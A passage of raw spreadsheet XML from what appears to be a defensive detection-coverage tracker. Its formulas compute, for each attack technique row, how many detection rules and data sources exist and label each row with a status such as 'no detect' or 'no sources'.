        <f t="array" ref="M395">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N395" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O395" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P395" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S39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95" t="s">
        <v>386</v>
      </c>
      <c r="U395" t="s">
        <v>1956</v>
      </c>
      <c r="V395" t="s">
        <v>1957</v>
      </c>
      <c r="W395" t="b">
        <v>1</v>
      </c>
      <c r="X395" t="s">
        <v>1941</v>
      </c>
    </row>
    <row r="396" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A396" t="s">
        <v>1941</v>
      </c>
      <c r="B396" t="s">
        <v>1958</v>
      </c>
      <c r="C396" t="s">
        <v>1959</v>
      </c>
      <c r="D396" t="s">
        <v>1942</v>
      </c>
      <c r="E396" t="s">
        <v>1960</v>
      </c>
      <c r="F396" s="9">
        <f t="shared" si="6"/>
        <v>2</v>
      </c>
      <c r="G396" s="9" cm="1">
        <f t="array" ref="G396">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H396" s="9" t="str" cm="1">
        <f t="array" ref="H396">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I396" s="9" t="str" cm="1">
        <f t="array" ref="I396">IF(SUM(IF($C396=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C396=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J396" s="9" t="str" cm="1">
        <f t="array" ref="J39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96" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M396" s="9" cm="1">
        <f t="array" ref="M396">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N396" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O396" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P396" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S39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96" t="s">
        <v>1690</v>
      </c>
      <c r="U396" t="s">
        <v>1961</v>
      </c>
      <c r="V396" t="s">
        <v>1962</v>
      </c>
      <c r="W396" t="b">
        <v>1</v>
      </c>
      <c r="X396" t="s">
        <v>1941</v>
      </c>
    </row>
    <row r="397" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A397" t="s">
        <v>1963</v>
      </c>
      <c r="B397" t="s">
        <v>1963</v>
      </c>
      <c r="C397" t="s">
        <v>177</v>
      </c>
      <c r="D397" t="s">
        <v>7</v>
      </c>
      <c r="E397" t="s">
        <v>1964</v>
      </c>
      <c r="F397" s="9">
        <f t="shared" si="6"/>
        <v>6</v>
      </c>
      <c r="G397" s="9" cm="1">
        <f t="array" ref="G397">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H397" s="9" cm="1">
        <f t="array" ref="H397">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>8</v>
      </c>
      <c r="I397" s="9" t="str" cm="1">
        <f t="array" ref="I397">IF(SUM(IF($C397=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C397=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J397" s="9" cm="1">
        <f t="array" ref="J39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397" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>8</v>
      </c>
      <c r="M397" s="9" cm="1">
        <f t="array" ref="M397">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>8</v>
      </c>
      <c r="N397" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O397" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P397" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S39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97" t="s">
        <v>979</v>
      </c>
      <c r="U397" t="s">
        <v>1965</v>
      </c>
      <c r="V397" t="s">
        <v>1966</v>
      </c>
      <c r="W397" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="398" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A398" t="s">
        <v>1963</v>
      </c>
      <c r="B398" t="s">
        <v>1967</v>
      </c>
      <c r="C398" t="s">
        <v>1968</v>
      </c>
      <c r="D398" t="s">
        <v>7</v>
      </c>
      <c r="E398" t="s">
        <v>1009</v>
      </c>
      <c r="F398" s="9">
        <f t="shared" si="6"/>
        <v>3</v>
      </c>
      <c r="G398" s="9" cm="1">
        <f t="array" ref="G398">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H398" s="9" t="str" cm="1">
        <f t="array" ref="H398">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I398" s="9" t="str" cm="1">
        <f t="array" ref="I398">IF(SUM(IF($C398=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C398=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J398" s="9" t="str" cm="1">
        <f t="array" ref="J39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98" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M398" s="9" cm="1">
        <f t="array" ref="M398">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N398" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O398" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P398" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S39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98" t="s">
        <v>1334</v>
      </c>
      <c r="U398" t="s">
        <v>1969</v>
      </c>
      <c r="V398" t="s">
        <v>1970</v>
      </c>
      <c r="W398" t="b">
        <v>1</v>
      </c>
      <c r="X398" t="s">
        <v>1963</v>
      </c>
    </row>
    <row r="399" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A399" t="s">
        <v>1963</v>
      </c>
      <c r="B399" t="s">
        <v>1971</v>
      </c>
      <c r="C399" t="s">
        <v>1972</v>
      </c>
      <c r="D399" t="s">
        <v>7</v>
      </c>
      <c r="E399" t="s">
        <v>1973</v>
      </c>
      <c r="F399" s="9">
        <f t="shared" si="6"/>
        <v>3</v>
      </c>
      <c r="G399" s="9" cm="1">
        <f t="array" ref="G399">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H399" s="9" t="str" cm="1">
        <f t="array" ref="H399">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I399" s="9" t="str" cm="1">
        <f t="array" ref="I399">IF(SUM(IF($C399=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C399=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J399" s="9" t="str" cm="1">
        <f t="array" ref="J39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399" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M399" s="9" cm="1">
        <f t="array" ref="M399">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N399" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O399" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P399" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S39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399" t="s">
        <v>386</v>
      </c>
      <c r="U399" t="s">
        <v>1974</v>
      </c>
      <c r="V399" t="s">
        <v>1975</v>
      </c>
      <c r="W399" t="b">
        <v>1</v>
      </c>
      <c r="X399" t="s">
        <v>1963</v>
      </c>
    </row>
    <row r="400" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A400" t="s">
        <v>1963</v>
      </c>
      <c r="B400" t="s">
        <v>1976</v>
      </c>
      <c r="C400" t="s">
        <v>1977</v>
      </c>
      <c r="D400" t="s">
        <v>7</v>
      </c>
      <c r="E400" t="s">
        <v>396</v>
      </c>
      <c r="F400" s="9">
        <f t="shared" si="6"/>
        <v>2</v>
      </c>
      <c r="G400" s="9" cm="1">
        <f t="array" ref="G400">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H400" s="9" t="str" cm="1">
        <f t="array" ref="H400">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I400" s="9" t="str" cm="1">
        <f t="array" ref="I400">IF(SUM(IF($C400=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C400=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J400" s="9" t="str" cm="1">
        <f t="array" ref="J40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00" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M400" s="9" cm="1">
        <f t="array" ref="M400">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N400" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O400" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P400" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S40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00" t="s">
        <v>503</v>
      </c>
      <c r="U400" t="s">
        <v>1978</v>
      </c>
      <c r="V400" t="s">
        <v>1979</v>
      </c>
      <c r="W400" t="b">
        <v>1</v>
      </c>
      <c r="X400" t="s">
        <v>1963</v>
      </c>
    </row>
    <row r="401" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A401" t="s">
        <v>1963</v>
      </c>
      <c r="B401" t="s">
        <v>1980</v>
      </c>
      <c r="C401" t="s">
        <v>327</v>
      </c>
      <c r="D401" t="s">
        <v>7</v>
      </c>
      <c r="E401" t="s">
        <v>396</v>
      </c>
      <c r="F401" s="9">
        <f t="shared" si="6"/>
        <v>2</v>
      </c>
      <c r="G401" s="9" cm="1">
        <f t="array" ref="G401">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H401" s="9" t="str" cm="1">
        <f t="array" ref="H401">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I401" s="9" t="str" cm="1">
        <f t="array" ref="I401">IF(SUM(IF($C401=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C401=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J401" s="9" t="str" cm="1">
        <f t="array" ref="J40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01" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M401" s="9" cm="1">
        <f t="array" ref="M401">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N401" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O401" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P401" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S40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01" t="s">
        <v>425</v>
      </c>
      <c r="U401" t="s">
        <v>1981</v>
      </c>
      <c r="V401" t="s">
        <v>1982</v>
      </c>
      <c r="W401" t="b">
        <v>1</v>
      </c>
      <c r="X401" t="s">
        <v>1963</v>
      </c>
    </row>
    <row r="402" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A402" t="s">
        <v>1963</v>
      </c>
      <c r="B402" t="s">
        <v>1983</v>
      </c>
      <c r="C402" t="s">
        <v>1984</v>
      </c>
      <c r="D402" t="s">
        <v>7</v>
      </c>
      <c r="E402" t="s">
        <v>1985</v>
      </c>
      <c r="F402" s="9">
        <f t="shared" si="6"/>
        <v>1</v>
      </c>
      <c r="G402" s="9" cm="1">
        <f t="array" ref="G402">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H402" s="9" t="str" cm="1">
        <f t="array" ref="H402">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I402" s="9" t="str" cm="1">
        <f t="array" ref="I402">IF(SUM(IF($C402=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C402=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J402" s="9" t="str" cm="1">
        <f t="array" ref="J40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02" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M402" s="9" cm="1">
        <f t="array" ref="M402">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N402" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O402" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P402" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S40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02" t="s">
        <v>520</v>
      </c>
      <c r="U402" t="s">
        <v>1986</v>
      </c>
      <c r="V402" t="s">
        <v>1987</v>
      </c>
      <c r="W402" t="b">
        <v>1</v>
      </c>
      <c r="X402" t="s">
        <v>1963</v>
      </c>
    </row>
    <row r="403" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A403" t="s">
        <v>1963</v>
      </c>
      <c r="B403" t="s">
        <v>1988</v>
      </c>
      <c r="C403" t="s">
        <v>1989</v>
      </c>
      <c r="D403" t="s">
        <v>7</v>
      </c>
      <c r="E403" t="s">
        <v>396</v>
      </c>
      <c r="F403" s="9">
        <f t="shared" si="6"/>
        <v>2</v>
      </c>
      <c r="G403" s="9" cm="1">
        <f t="array" ref="G403">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H403" s="9" t="str" cm="1">
        <f t="array" ref="H403">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I403" s="9" t="str" cm="1">
        <f t="array" ref="I403">IF(SUM(IF($C403=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C403=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J403" s="9" t="str" cm="1">
        <f t="array" ref="J40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03" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M403" s="9" cm="1">
        <f t="array" ref="M403">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N403" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O403" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P403" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S40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03" t="s">
        <v>386</v>
      </c>
      <c r="U403" t="s">
        <v>1990</v>
      </c>
      <c r="V403" t="s">
        <v>1991</v>
      </c>
      <c r="W403" t="b">
        <v>1</v>
      </c>
      <c r="X403" t="s">
        <v>1963</v>
      </c>
    </row>
    <row r="404" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A404" t="s">
        <v>1963</v>
      </c>
      <c r="B404" t="s">
        <v>1992</v>
      </c>
      <c r="C404" t="s">
        <v>1993</v>
      </c>
      <c r="D404" t="s">
        <v>7</v>
      </c>
      <c r="E404" t="s">
        <v>1994</v>
      </c>
      <c r="F404" s="9">
        <f t="shared" si="6"/>
        <v>2</v>
      </c>
      <c r="G404" s="9" cm="1">
        <f t="array" ref="G404">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H404" s="9" t="str" cm="1">
        <f t="array" ref="H404">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I404" s="9" t="str" cm="1">
        <f t="array" ref="I404">IF(SUM(IF($C404=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C404=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J404" s="9" t="str" cm="1">
        <f t="array" ref="J40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04" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M404" s="9" cm="1">
        <f t="array" ref="M404">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N404" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O404" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P404" s="14" t="str">
